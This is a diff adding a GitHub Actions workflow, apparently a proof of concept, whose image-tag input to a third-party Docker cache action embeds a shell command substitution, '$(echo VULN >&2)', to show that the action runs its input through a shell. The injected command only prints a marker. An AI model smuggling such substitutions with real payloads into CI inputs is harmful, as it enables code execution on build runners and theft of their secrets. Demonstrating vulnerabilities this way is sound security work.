@@ -1,0 +1,18 @@
+name: Codex Proof
+
+on:
+  push:
+    branches:
+    - codex-proof-workflow
+
+permissions:
+  contents: read
+
+jobs:
+  prove-shell-interpretation:
+    runs-on: ubuntu-24.04
+    steps:
+    - name: Prime Docker cache with probe image tag
+      uses: envoyproxy/toolshed/actions/docker/cache/prime@8d5d8d4b9eeb5e4e76b92341b0b1b1f6438af231
+      with:
+        image-tag: $(echo VULN >&2)docker.io/library/alpine:latest
